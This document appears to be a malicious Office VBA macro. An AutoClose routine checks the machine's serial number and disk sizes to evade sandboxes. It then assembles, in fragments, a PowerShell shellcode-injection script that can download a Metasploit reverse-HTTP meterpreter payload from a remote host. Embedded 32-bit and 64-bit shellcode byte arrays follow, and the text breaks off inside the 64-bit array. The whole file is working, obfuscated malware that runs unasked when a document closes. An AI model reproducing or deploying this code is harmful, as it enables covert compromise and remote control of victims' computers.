Sub AutoClose()
        uwVbQc
End Sub

Public Function uwVbQc() As Variant
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
        Set ID = objWMIService.ExecQuery("Select IdentifyingNumber from Win32_ComputerSystemproduct")
        For Each objItem In ID
                If StrComp(objItem.IdentifyingNumber, "2UA20511KN") = 0 Then End
        Next
        Set disksize = objWMIService.ExecQuery("Select Size from Win32_logicaldisk")
        For Each objItem In disksize
                If (objItem.Size = 42949603328#) Then End
                If (objItem.Size = 68719443968#) Then End
        Next
        Dim VrOjTp As String
        VrOjTp = "function Invoke-Shellcode
{
[CmdletBinding( Defaul"
        VrOjTp = VrOjTp + "tParameterSetName = 'RunLocal', SupportsShouldProc"
        VrOjTp = VrOjTp + "ess = $True , ConfirmImpact = 'High')] Param (
   "
        VrOjTp = VrOjTp + " [ValidateNotNullOrEmpty()]
    [UInt16]
    $Proc"
        VrOjTp = VrOjTp + "essID,
    [Parameter( ParameterSetName = 'RunLoca"
        VrOjTp = VrOjTp + "l' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
"
        VrOjTp = VrOjTp + "    $Shellcode,
    [Parameter( ParameterSetName ="
        VrOjTp = VrOjTp + " 'Metasploit' )]
    [ValidateSet( 'windows/meterp"
        VrOjTp = VrOjTp + "reter/reverse_http',
                  'windows/me"
        VrOjTp = VrOjTp + "terpreter/reverse_https',
                  Ignore"
        VrOjTp = VrOjTp + "Case = $True )]
    [String]
    $Payload = 'windo"
        VrOjTp = VrOjTp + "ws/meterpreter/reverse_http',
    [Parameter( Para"
        VrOjTp = VrOjTp + "meterSetName = 'ListPayloads' )]
    [Switch]
    "
        VrOjTp = VrOjTp + "$ListMetasploitPayloads,
    [Parameter( Mandatory"
        VrOjTp = VrOjTp + " = $True,
                ParameterSetName = 'Meta"
        VrOjTp = VrOjTp + "sploit' )]
    [ValidateNotNullOrEmpty()]
    [Str"
        VrOjTp = VrOjTp + "ing]
    $Lhost = '127.0.0.1',
    [Parameter( Man"
        VrOjTp = VrOjTp + "datory = $True,
                ParameterSetName ="
        VrOjTp = VrOjTp + " 'Metasploit' )]
    [ValidateRange( 1,65535 )]
  "
        VrOjTp = VrOjTp + "  [Int]
    $Lport = 8443,
    [Parameter( Paramet"
        VrOjTp = VrOjTp + "erSetName = 'Metasploit' )]
    [ValidateNotNull()"
        VrOjTp = VrOjTp + "]
    [String]
    $UserAgent = (Get-ItemProperty "
        VrOjTp = VrOjTp + "-Path 'HKCU:\Software\Microsoft\Windows\CurrentVer"
        VrOjTp = VrOjTp + "sion\Internet Settings').'User Agent',
    [Parame"
        VrOjTp = VrOjTp + "ter( ParameterSetName = 'Metasploit' )]
    [Valid"
        VrOjTp = VrOjTp + "ateNotNull()]
    [Switch]
    $Legacy = $False,
 "
        VrOjTp = VrOjTp + "   [Parameter( ParameterSetName = 'Metasploit' )]
"
        VrOjTp = VrOjTp + "    [ValidateNotNull()]
    [Switch]
    $Proxy = "
        VrOjTp = VrOjTp + "$False,
    [Switch]
    $Force = $False
)
    Set"
        VrOjTp = VrOjTp + "-StrictMode -Version 2.0
    if ($PsCmdlet.Paramet"
        VrOjTp = VrOjTp + "erSetName -eq 'ListPayloads')
    {
        $Avail"
        VrOjTp = VrOjTp + "ablePayloads = (Get-Command Invoke-Shellcode).Para"
        VrOjTp = VrOjTp + "meters['Payload'].Attributes |
            Where-O"
        VrOjTp = VrOjTp + "bject {$_.TypeId -eq [System.Management.Automation"
        VrOjTp = VrOjTp + ".ValidateSetAttribute]}
        foreach ($Payload "
        VrOjTp = VrOjTp + "in $AvailablePayloads.ValidValues)
        {
     "
        VrOjTp = VrOjTp + "       New-Object PSObject -Property @{ Payloads ="
        VrOjTp = VrOjTp + " $Payload }
        }
        Return
    }
    if "
        VrOjTp = VrOjTp + "( $PSBoundParameters['ProcessID'] )
    {
        "
        VrOjTp = VrOjTp + "Get-Process -Id $ProcessID -ErrorAction Stop | Out"
        VrOjTp = VrOjTp + "-Null
    }
    function Local:Get-DelegateType
  "
        VrOjTp = VrOjTp + "  {
        Param
        (
            [OutputTyp"
        VrOjTp = VrOjTp + "e([Type])]
            [Parameter( Position = 0)]
"
        VrOjTp = VrOjTp + "            [Type[]]
            $Parameters = (Ne"
        VrOjTp = VrOjTp + "w-Object Type[](0)),
            [Parameter( Posit"
        VrOjTp = VrOjTp + "ion = 1 )]
            [Type]
            $ReturnT"
        VrOjTp = VrOjTp + "ype = [Void]
        )
        $Domain = [AppDomai"
        VrOjTp = VrOjTp + "n]::CurrentDomain
        $DynAssembly = New-Objec"
        VrOjTp = VrOjTp + "t System.Reflection.AssemblyName('ReflectedDelegat"
        VrOjTp = VrOjTp + "e')
        $AssemblyBuilder = $Domain.DefineDynam"
        VrOjTp = VrOjTp + "icAssembly($DynAssembly, [System.Reflection.Emit.A"
        VrOjTp = VrOjTp + "ssemblyBuilderAccess]::Run)
        $ModuleBuilder"
        VrOjTp = VrOjTp + " = $AssemblyBuilder.DefineDynamicModule('InMemoryM"
        VrOjTp = VrOjTp + "odule', $false)
        $TypeBuilder = $ModuleBuil"
        VrOjTp = VrOjTp + "der.DefineType('MyDelegateType', 'Class, Public, S"
        VrOjTp = VrOjTp + "ealed, AnsiClass, AutoClass', [System.MulticastDel"
        VrOjTp = VrOjTp + "egate])
        $ConstructorBuilder = $TypeBuilder"
        VrOjTp = VrOjTp + ".DefineConstructor('RTSpecialName, HideBySig, Publ"
        VrOjTp = VrOjTp + "ic', [System.Reflection.CallingConventions]::Stand"
        VrOjTp = VrOjTp + "ard, $Parameters)
        $ConstructorBuilder.SetI"
        VrOjTp = VrOjTp + "mplementationFlags('Runtime, Managed')
        $Me"
        VrOjTp = VrOjTp + "thodBuilder = $TypeBuilder.DefineMethod('Invoke', "
        VrOjTp = VrOjTp + "'Public, HideBySig, NewSlot, Virtual', $ReturnType"
        VrOjTp = VrOjTp + ", $Parameters)
        $MethodBuilder.SetImplement"
        VrOjTp = VrOjTp + "ationFlags('Runtime, Managed')
        Write-Outpu"
        VrOjTp = VrOjTp + "t $TypeBuilder.CreateType()
    }
    function Loc"
        VrOjTp = VrOjTp + "al:Get-ProcAddress
    {
        Param
        (
 "
        VrOjTp = VrOjTp + "           [OutputType([IntPtr])]
            [Par"
        VrOjTp = VrOjTp + "ameter( Position = 0, Mandatory = $True )]
       "
        VrOjTp = VrOjTp + "     [String]
            $Module,
            [Pa"
        VrOjTp = VrOjTp + "rameter( Position = 1, Mandatory = $True )]
      "
        VrOjTp = VrOjTp + "      [String]
            $Procedure
        )
  "
        VrOjTp = VrOjTp + "      $SystemAssembly = [AppDomain]::CurrentDomain"
        VrOjTp = VrOjTp + ".GetAssemblies() |
            Where-Object { $_.G"
        VrOjTp = VrOjTp + "lobalAssemblyCache -And $_.Location.Split('\\')[-1"
        VrOjTp = VrOjTp + "].Equals('System.dll') }
        $UnsafeNativeMeth"
        VrOjTp = VrOjTp + "ods = $SystemAssembly.GetType('Microsoft.Win32.Uns"
        VrOjTp = VrOjTp + "afeNativeMethods')
        $GetModuleHandle = $Uns"
        VrOjTp = VrOjTp + "afeNativeMethods.GetMethod('GetModuleHandle')
    "
        VrOjTp = VrOjTp + "    $GetProcAddress = $UnsafeNativeMethods.GetMeth"
        VrOjTp = VrOjTp + "od('GetProcAddress', [Type[]]@([System.Runtime.Int"
        VrOjTp = VrOjTp + "eropServices.HandleRef], [String]))
        $Kern3"
        VrOjTp = VrOjTp + "2Handle = $GetModuleHandle.Invoke($null, @($Module"
        VrOjTp = VrOjTp + "))
        $tmpPtr = New-Object IntPtr
        $Ha"
        VrOjTp = VrOjTp + "ndleRef = New-Object System.Runtime.InteropService"
        VrOjTp = VrOjTp + "s.HandleRef($tmpPtr, $Kern32Handle)
        Write-"
        VrOjTp = VrOjTp + "Output $GetProcAddress.Invoke($null, @([System.Run"
        VrOjTp = VrOjTp + "time.InteropServices.HandleRef]$HandleRef, $Proced"
        VrOjTp = VrOjTp + "ure))
    }
    function Local:Emit-CallThreadStub"
        VrOjTp = VrOjTp + " ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [I"
        VrOjTp = VrOjTp + "nt] $Architecture)
    {
        $IntSizePtr = $Ar"
        VrOjTp = VrOjTp + "chitecture / 8
        function Local:ConvertTo-Li"
        VrOjTp = VrOjTp + "ttleEndian ([IntPtr] $Address)
        {
         "
        VrOjTp = VrOjTp + "   $LittleEndianByteArray = New-Object Byte[](0)
 "
        VrOjTp = VrOjTp + "           $Address.ToString("X$($IntSizePtr*2)") "
        VrOjTp = VrOjTp + "-split '([A-F0-9]{2})' | ForEach-Object { if ($_) "
        VrOjTp = VrOjTp + "{ $LittleEndianByteArray += [Byte] ('0x{0}' -f $_)"
        VrOjTp = VrOjTp + " } }
            [System.Array]::Reverse($LittleEn"
        VrOjTp = VrOjTp + "dianByteArray)
            Write-Output $LittleEnd"
        VrOjTp = VrOjTp + "ianByteArray
        }
        $CallStub = New-Obj"
        VrOjTp = VrOjTp + "ect Byte[](0)
        if ($IntSizePtr -eq 8)
     "
        VrOjTp = VrOjTp + "   {
            [Byte[]] $CallStub = 0x48,0xB8   "
        VrOjTp = VrOjTp + "                   # MOV   QWORD RAX, &shellcode
 "
        VrOjTp = VrOjTp + "           $CallStub += ConvertTo-LittleEndian $Ba"
        VrOjTp = VrOjTp + "seAddr       # &shellcode
            $CallStub +="
        VrOjTp = VrOjTp + " 0xFF,0xD0                              # CALL  RA"
        VrOjTp = VrOjTp + "X
            $CallStub += 0x6A,0x00              "
        VrOjTp = VrOjTp + "                # PUSH  BYTE 0
            $CallSt"
        VrOjTp = VrOjTp + "ub += 0x48,0xB8                              # MOV"
        VrOjTp = VrOjTp + "   QWORD RAX, &ExitThread
            $CallStub +="
        VrOjTp = VrOjTp + " ConvertTo-LittleEndian $ExitThreadAddr # &ExitThr"
        VrOjTp = VrOjTp + "ead
            $CallStub += 0xFF,0xD0            "
        VrOjTp = VrOjTp + "                  # CALL  RAX
        }
        el"
        VrOjTp = VrOjTp + "se
        {
            [Byte[]] $CallStub = 0xB8"
        VrOjTp = VrOjTp + "                           # MOV   DWORD EAX, &she"
        VrOjTp = VrOjTp + "llcode
            $CallStub += ConvertTo-LittleEn"
        VrOjTp = VrOjTp + "dian $BaseAddr       # &shellcode
            $Cal"
        VrOjTp = VrOjTp + "lStub += 0xFF,0xD0                              # "
        VrOjTp = VrOjTp + "CALL  EAX
            $CallStub += 0x6A,0x00      "
        VrOjTp = VrOjTp + "                        # PUSH  BYTE 0
           "
        VrOjTp = VrOjTp + " $CallStub += 0xB8                                "
        VrOjTp = VrOjTp + "   # MOV   DWORD EAX, &ExitThread
            $Cal"
        VrOjTp = VrOjTp + "lStub += ConvertTo-LittleEndian $ExitThreadAddr # "
        VrOjTp = VrOjTp + "&ExitThread
            $CallStub += 0xFF,0xD0    "
        VrOjTp = VrOjTp + "                          # CALL  EAX
        }
  "
        VrOjTp = VrOjTp + "      Write-Output $CallStub
    }
    function Lo"
        VrOjTp = VrOjTp + "cal:Inject-RemoteShellcode ([Int] $ProcessID)
    "
        VrOjTp = VrOjTp + "{
        $hProcess = $OpenProcess.Invoke(0x001F0F"
        VrOjTp = VrOjTp + "FF, $false, $ProcessID) # ProcessAccessFlags.All ("
        VrOjTp = VrOjTp + "0x001F0FFF)
        if (!$hProcess)
        {
    "
        VrOjTp = VrOjTp + "        Throw "Unable to open a process handle for"
        VrOjTp = VrOjTp + " PID: $ProcessID"
        }
        $IsWow64 = $fa"
        VrOjTp = VrOjTp + "lse
        if ($64bitCPU) # Only perform theses c"
        VrOjTp = VrOjTp + "hecks if CPU is 64-bit
        {
            $IsWo"
        VrOjTp = VrOjTp + "w64Process.Invoke($hProcess, [Ref] $IsWow64) | Out"
        VrOjTp = VrOjTp + "-Null
            if ((!$IsWow64) -and $PowerShell"
        VrOjTp = VrOjTp + "32bit)
            {
                Throw 'Unable"
        VrOjTp = VrOjTp + " to inject 64-bit shellcode from within 32-bit Pow"
        VrOjTp = VrOjTp + "ershell. Use the 64-bit version of Powershell if y"
        VrOjTp = VrOjTp + "ou want this to work.'
            }
            e"
        VrOjTp = VrOjTp + "lseif ($IsWow64) # 32-bit Wow64 process
          "
        VrOjTp = VrOjTp + "  {
                if ($Shellcode32.Length -eq 0)"
        VrOjTp = VrOjTp + "
                {
                    Throw 'No s"
        VrOjTp = VrOjTp + "hellcode was placed in the $Shellcode32 variable!'"
        VrOjTp = VrOjTp + "
                }
                $Shellcode = $S"
        VrOjTp = VrOjTp + "hellcode32
            }
            else # 64-bit"
        VrOjTp = VrOjTp + " process
            {
                if ($Shellc"
        VrOjTp = VrOjTp + "ode64.Length -eq 0)
                {
            "
        VrOjTp = VrOjTp + "        Throw 'No shellcode was placed in the $She"
        VrOjTp = VrOjTp + "llcode64 variable!'
                }
            "
        VrOjTp = VrOjTp + "    $Shellcode = $Shellcode64
            }
      "
        VrOjTp = VrOjTp + "  }
        else # 32-bit CPU
        {
          "
        VrOjTp = VrOjTp + "  if ($Shellcode32.Length -eq 0)
            {
   "
        VrOjTp = VrOjTp + "             Throw 'No shellcode was placed in the"
        VrOjTp = VrOjTp + " $Shellcode32 variable!'
            }
           "
        VrOjTp = VrOjTp + " $Shellcode = $Shellcode32
        }
        $Remo"
        VrOjTp = VrOjTp + "teMemAddr = $VirtualAllocEx.Invoke($hProcess, [Int"
        VrOjTp = VrOjTp + "Ptr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) #"
        VrOjTp = VrOjTp + " (Reserve|Commit, RWX)
        if (!$RemoteMemAddr"
        VrOjTp = VrOjTp + ")
        {
            Throw "Unable to allocate "
        VrOjTp = VrOjTp + "shellcode memory in PID: $ProcessID"
        }
   "
        VrOjTp = VrOjTp + "     $WriteProcessMemory.Invoke($hProcess, $Remote"
        VrOjTp = VrOjTp + "MemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) |"
        VrOjTp = VrOjTp + " Out-Null
        $ExitThreadAddr = Get-ProcAddres"
        VrOjTp = VrOjTp + "s kernel32.dll ExitThread
        if ($IsWow64)
  "
        VrOjTp = VrOjTp + "      {
            $CallStub = Emit-CallThreadStu"
        VrOjTp = VrOjTp + "b $RemoteMemAddr $ExitThreadAddr 32
        }
    "
        VrOjTp = VrOjTp + "    else
        {
            $CallStub = Emit-Ca"
        VrOjTp = VrOjTp + "llThreadStub $RemoteMemAddr $ExitThreadAddr 64
   "
        VrOjTp = VrOjTp + "     }
        $RemoteStubAddr = $VirtualAllocEx.I"
        VrOjTp = VrOjTp + "nvoke($hProcess, [IntPtr]::Zero, $CallStub.Length,"
        VrOjTp = VrOjTp + " 0x3000, 0x40) # (Reserve|Commit, RWX)
        if "
        VrOjTp = VrOjTp + "(!$RemoteStubAddr)
        {
            Throw "Un"
        VrOjTp = VrOjTp + "able to allocate thread call stub memory in PID: $"
        VrOjTp = VrOjTp + "ProcessID"
        }
        $WriteProcessMemory.I"
        VrOjTp = VrOjTp + "nvoke($hProcess, $RemoteStubAddr, $CallStub, $Call"
        VrOjTp = VrOjTp + "Stub.Length, [Ref] 0) | Out-Null
        $ThreadHa"
        VrOjTp = VrOjTp + "ndle = $CreateRemoteThread.Invoke($hProcess, [IntP"
        VrOjTp = VrOjTp + "tr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, "
        VrOjTp = VrOjTp + "[IntPtr]::Zero)
        if (!$ThreadHandle)
      "
        VrOjTp = VrOjTp + "  {
            Throw "Unable to launch remote thr"
        VrOjTp = VrOjTp + "ead in PID: $ProcessID"
        }
        $CloseHa"
        VrOjTp = VrOjTp + "ndle.Invoke($hProcess) | Out-Null
    }
    functi"
        VrOjTp = VrOjTp + "on Local:Inject-LocalShellcode
    {
        if ($"
        VrOjTp = VrOjTp + "PowerShell32bit) {
            if ($Shellcode32.Le"
        VrOjTp = VrOjTp + "ngth -eq 0)
            {
                Throw 'N"
        VrOjTp = VrOjTp + "o shellcode was placed in the $Shellcode32 variabl"
        VrOjTp = VrOjTp + "e!'
                return
            }
         "
        VrOjTp = VrOjTp + "   $Shellcode = $Shellcode32
        }
        els"
        VrOjTp = VrOjTp + "e
        {
            if ($Shellcode64.Length -e"
        VrOjTp = VrOjTp + "q 0)
            {
                Throw 'No shell"
        VrOjTp = VrOjTp + "code was placed in the $Shellcode64 variable!'
   "
        VrOjTp = VrOjTp + "             return
            }
            $She"
        VrOjTp = VrOjTp + "llcode = $Shellcode64
        }
        $BaseAddre"
        VrOjTp = VrOjTp + "ss = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellco"
        VrOjTp = VrOjTp + "de.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        VrOjTp = VrOjTp + "X)
        if (!$BaseAddress)
        {
          "
        VrOjTp = VrOjTp + "  Throw "Unable to allocate shellcode memory in PI"
        VrOjTp = VrOjTp + "D: $ProcessID"
        }
        [System.Runtime.I"
        VrOjTp = VrOjTp + "nteropServices.Marshal]::Copy($Shellcode, 0, $Base"
        VrOjTp = VrOjTp + "Address, $Shellcode.Length)
        $ExitThreadAdd"
        VrOjTp = VrOjTp + "r = Get-ProcAddress kernel32.dll ExitThread
      "
        VrOjTp = VrOjTp + "  if ($PowerShell32bit)
        {
            $Cal"
        VrOjTp = VrOjTp + "lStub = Emit-CallThreadStub $BaseAddress $ExitThre"
        VrOjTp = VrOjTp + "adAddr 32
        }
        else
        {
       "
        VrOjTp = VrOjTp + "     $CallStub = Emit-CallThreadStub $BaseAddress "
        VrOjTp = VrOjTp + "$ExitThreadAddr 64
        }
        $CallStubAddr"
        VrOjTp = VrOjTp + "ess = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallSt"
        VrOjTp = VrOjTp + "ub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        VrOjTp = VrOjTp + "X)
        if (!$CallStubAddress)
        {
      "
        VrOjTp = VrOjTp + "      Throw "Unable to allocate thread call stub.""
        VrOjTp = VrOjTp + "
        }
        [System.Runtime.InteropServices"
        VrOjTp = VrOjTp + ".Marshal]::Copy($CallStub, 0, $CallStubAddress, $C"
        VrOjTp = VrOjTp + "allStub.Length)
        $ThreadHandle = $CreateThr"
        VrOjTp = VrOjTp + "ead.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $B"
        VrOjTp = VrOjTp + "aseAddress, 0, [IntPtr]::Zero)
        if (!$Threa"
        VrOjTp = VrOjTp + "dHandle)
        {
            Throw "Unable to la"
        VrOjTp = VrOjTp + "unch thread."
        }
        $WaitForSingleObje"
        VrOjTp = VrOjTp + "ct.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
  "
        VrOjTp = VrOjTp + "      $VirtualFree.Invoke($CallStubAddress, $CallS"
        VrOjTp = VrOjTp + "tub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE ("
        VrOjTp = VrOjTp + "0x8000)
        $VirtualFree.Invoke($BaseAddress, "
        VrOjTp = VrOjTp + "$Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RE"
        VrOjTp = VrOjTp + "LEASE (0x8000)
    }
    $IsWow64ProcessAddr = Get"
        VrOjTp = VrOjTp + "-ProcAddress kernel32.dll IsWow64Process
    if ($"
        VrOjTp = VrOjTp + "IsWow64ProcessAddr)
    {
        $IsWow64ProcessD"
        VrOjTp = VrOjTp + "elegate = Get-DelegateType @([IntPtr], [Bool].Make"
        VrOjTp = VrOjTp + "ByRefType()) ([Bool])
        $IsWow64Process = [S"
        VrOjTp = VrOjTp + "ystem.Runtime.InteropServices.Marshal]::GetDelegat"
        VrOjTp = VrOjTp + "eForFunctionPointer($IsWow64ProcessAddr, $IsWow64P"
        VrOjTp = VrOjTp + "rocessDelegate)
        $64bitCPU = $true
    }
  "
        VrOjTp = VrOjTp + "  else
    {
        $64bitCPU = $false
    }
    "
        VrOjTp = VrOjTp + "if ([IntPtr]::Size -eq 4)
    {
        $PowerShel"
        VrOjTp = VrOjTp + "l32bit = $true
    }
    else
    {
        $Power"
        VrOjTp = VrOjTp + "Shell32bit = $false
    }
    if ($PsCmdlet.Parame"
        VrOjTp = VrOjTp + "terSetName -eq 'Metasploit')
    {
        if (!$P"
        VrOjTp = VrOjTp + "owerShell32bit) {
            $RootInvocation = $M"
        VrOjTp = VrOjTp + "yInvocation.Line
            $Response = $True
   "
        VrOjTp = VrOjTp + "         if ( $Force -or ( $Response = $psCmdlet.S"
        VrOjTp = VrOjTp + "houldContinue( "Do you want to launch the payload "
        VrOjTp = VrOjTp + "from x86 Powershell?",
                   "Attempt"
        VrOjTp = VrOjTp + " to execute 32-bit shellcode from 64-bit Powershel"
        VrOjTp = VrOjTp + "l. Note: This process takes about one minute. Be p"
        VrOjTp = VrOjTp + "atient! You will also see some artifacts of the sc"
        VrOjTp = VrOjTp + "ript loading in the other process." ) ) ) { }
    "
        VrOjTp = VrOjTp + "        if ( !$Response )
            {
          "
        VrOjTp = VrOjTp + "      Return
            }
            if ($MyInvo"
        VrOjTp = VrOjTp + "cation.BoundParameters['Force'])
            {
   "
        VrOjTp = VrOjTp + "             $Command = "function $($MyInvocation."
        VrOjTp = VrOjTp + "InvocationName) {`n" + $MyInvocation.MyCommand.Scr"
        VrOjTp = VrOjTp + "iptBlock + "`n}`n$($RootInvocation)`n`n"
         "
        VrOjTp = VrOjTp + "   }
            else
            {
              "
        VrOjTp = VrOjTp + "  $Command = "function $($MyInvocation.InvocationN"
        VrOjTp = VrOjTp + "ame) {`n" + $MyInvocation.MyCommand.ScriptBlock + "
        VrOjTp = VrOjTp + ""`n}`n$($RootInvocation) -Force`n`n"
            }"
        VrOjTp = VrOjTp + "
            $CommandBytes = [System.Text.Encoding"
        VrOjTp = VrOjTp + "]::Ascii.GetBytes($Command)
            $EncodedCo"
        VrOjTp = VrOjTp + "mmand = [Convert]::ToBase64String($CommandBytes)
 "
        VrOjTp = VrOjTp + "           $Execute = '$Command' + " | $Env:windir"
        VrOjTp = VrOjTp + "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -N"
        VrOjTp = VrOjTp + "oProfile -Command -"
            Invoke-Expression"
        VrOjTp = VrOjTp + " -Command $Execute | Out-Null
            Return
 "
        VrOjTp = VrOjTp + "       }
        $Response = $True
        if ( $F"
        VrOjTp = VrOjTp + "orce -or ( $Response = $psCmdlet.ShouldContinue( ""
        VrOjTp = VrOjTp + "Do you know what you're doing?",
               "A"
        VrOjTp = VrOjTp + "bout to download Metasploit payload '$($Payload)' "
        VrOjTp = VrOjTp + "LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
      "
        VrOjTp = VrOjTp + "  if ( !$Response )
        {
            Return
 "
        VrOjTp = VrOjTp + "       }
        switch ($Payload)
        {
     "
        VrOjTp = VrOjTp + "       'windows/meterpreter/reverse_http'
        "
        VrOjTp = VrOjTp + "    {
                $SSL = ''
            }
    "
        VrOjTp = VrOjTp + "        'windows/meterpreter/reverse_https'
      "
        VrOjTp = VrOjTp + "      {
                $SSL = 's'
               "
        VrOjTp = VrOjTp + " [System.Net.ServicePointManager]::ServerCertifica"
        VrOjTp = VrOjTp + "teValidationCallback = {$True}
            }
     "
        VrOjTp = VrOjTp + "   }
        if ($Legacy)
        {
            $R"
        VrOjTp = VrOjTp + "equest = "http$($SSL)://$($Lhost):$($Lport)/INITM""
        VrOjTp = VrOjTp + "
        } else {
            $CharArray = 48..57 "
        VrOjTp = VrOjTp + "+ 65..90 + 97..122 | ForEach-Object {[Char]$_}
   "
        VrOjTp = VrOjTp + "         $SumTest = $False
            while ($Sum"
        VrOjTp = VrOjTp + "Test -eq $False)
            {
                $Ge"
        VrOjTp = VrOjTp + "neratedUri = $CharArray | Get-Random -Count 4
    "
        VrOjTp = VrOjTp + "            $SumTest = (([int[]] $GeneratedUri | M"
        VrOjTp = VrOjTp + "easure-Object -Sum).Sum % 0x100 -eq 92)
          "
        VrOjTp = VrOjTp + "  }
            $RequestUri = -join $GeneratedUri
"
        VrOjTp = VrOjTp + "            $Request = "http$($SSL)://$($Lhost):$("
        VrOjTp = VrOjTp + "$Lport)/$($RequestUri)"
        }
        $Uri = N"
        VrOjTp = VrOjTp + "ew-Object Uri($Request)
        $WebClient = New-O"
        VrOjTp = VrOjTp + "bject System.Net.WebClient
        $WebClient.Head"
        VrOjTp = VrOjTp + "ers.Add('user-agent', "$UserAgent")
        if ($P"
        VrOjTp = VrOjTp + "roxy)
        {
            $WebProxyObject = New-"
        VrOjTp = VrOjTp + "Object System.Net.WebProxy
            $ProxyAddre"
        VrOjTp = VrOjTp + "ss = (Get-ItemProperty -Path 'HKCU:\Software\Micro"
        VrOjTp = VrOjTp + "soft\Windows\CurrentVersion\Internet Settings').Pr"
        VrOjTp = VrOjTp + "oxyServer
            if ($ProxyAddress)
         "
        VrOjTp = VrOjTp + "   {
                $WebProxyObject.Address = $Pr"
        VrOjTp = VrOjTp + "oxyAddress
                $WebProxyObject.UseDefa"
        VrOjTp = VrOjTp + "ultCredentials = $True
                $WebClientO"
        VrOjTp = VrOjTp + "bject.Proxy = $WebProxyObject
            }
      "
        VrOjTp = VrOjTp + "  }
        try
        {
            [Byte[]] $Sh"
        VrOjTp = VrOjTp + "ellcode32 = $WebClient.DownloadData($Uri)
        "
        VrOjTp = VrOjTp + "}
        catch
        {
            Throw "$($Er"
        VrOjTp = VrOjTp + "ror[0])"
        }
        [Byte[]] $Shellcode64 ="
        VrOjTp = VrOjTp + " $Shellcode32
    }
    elseif ($PSBoundParameters"
        VrOjTp = VrOjTp + "['Shellcode'])
    {
        [Byte[]] $Shellcode32"
        VrOjTp = VrOjTp + " = $Shellcode
        [Byte[]] $Shellcode64 = $She"
        VrOjTp = VrOjTp + "llcode32
    }
    else
    {
        [Byte[]] $Sh"
        VrOjTp = VrOjTp + "ellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0"
        VrOjTp = VrOjTp + "x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
     "
        VrOjTp = VrOjTp + "                             0x52,0x0c,0x8b,0x52,0"
        VrOjTp = VrOjTp + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
        VrOjTp = VrOjTp + "x31,0xc0,
                                  0xac,0"
        VrOjTp = VrOjTp + "x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0"
        VrOjTp = VrOjTp + "xc7,0xe2,0xf0,0x52,0x57,
                         "
        VrOjTp = VrOjTp + "         0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0"
        VrOjTp = VrOjTp + "x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
          "
        VrOjTp = VrOjTp + "                        0xd0,0x50,0x8b,0x48,0x18,0"
        VrOjTp = VrOjTp + "x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0"
        VrOjTp = VrOjTp + "x8b,
                                  0x01,0xd6,0"
        VrOjTp = VrOjTp + "x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0"
        VrOjTp = VrOjTp + "x38,0xe0,0x75,0xf4,
                              "
        VrOjTp = VrOjTp + "    0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0"
        VrOjTp = VrOjTp + "x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
               "
        VrOjTp = VrOjTp + "                   0x0c,0x4b,0x8b,0x58,0x1c,0x01,0"
        VrOjTp = VrOjTp + "xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
"
        VrOjTp = VrOjTp + "                                  0x5b,0x5b,0x61,0"
        VrOjTp = VrOjTp + "x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0"
        VrOjTp = VrOjTp + "xeb,0x86,0x5d,
                                  0"
        VrOjTp = VrOjTp + "x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0"
        VrOjTp = VrOjTp + "x31,0x8b,0x6f,0x87,0xff,0xd5,
                    "
        VrOjTp = VrOjTp + "              0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0"
        VrOjTp = VrOjTp + "x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
     "
        VrOjTp = VrOjTp + "                             0x80,0xfb,0xe0,0x75,0"
        VrOjTp = VrOjTp + "x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0"
        VrOjTp = VrOjTp + "xd5,0x63,
                                  0x61,0"
        VrOjTp = VrOjTp + "x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0"
        VrOjTp = VrOjTp + "xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0"
        VrOjTp = VrOjTp + "x41,0x51,0x41,0x50,0x52,0x51,
                    "
        VrOjTp = VrOjTp + "              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0"
        VrOjTp = VrOjTp + "x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     "
        VrOjTp = VrOjTp + "                             0x20,0x48,0x8b,0x72,0"
        VrOjTp = VrOjTp + "x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0"
        VrOjTp = VrOjTp + "x31,0xc0,
                                  0xac,0"
        VrOjTp = VrOjTp + "x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0"
        VrOjTp = VrOjTp + "x41,0x01,0xc1,0xe2,0xed,
                         "
        VrOjTp = VrOjTp + "         0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0"
